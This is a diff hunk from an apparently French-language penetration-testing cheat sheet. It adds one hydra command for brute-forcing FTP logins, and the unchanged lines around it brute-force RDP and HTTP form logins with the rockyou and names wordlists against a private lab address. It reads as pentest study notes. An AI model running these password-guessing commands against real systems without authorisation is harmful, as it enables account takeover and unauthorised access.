@@ -458,6 +458,7 @@ Protocoles à tester : SMB, WINRM, RDP, MSSQL, FTP, LDAP, SSH
     hydra -vV -L /usr/share/wordlists/dirb/others/names.txt -p "Mdp123" rdp://192.168.100.100
     hydra -vV -l tim -P /usr/share/wordlists/rockyou.txt 192.168.100.100 http-post-form "/index.php:user=user&password=\^PASS\^:Invalid"
     hydra -vV -l tim -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.100.100 http-get
+    hydra -vV -l tim -P /usr/share/wordlists/rockyou.txt ftp://192.168.100.100:21
 
 ## Bases de données 
 
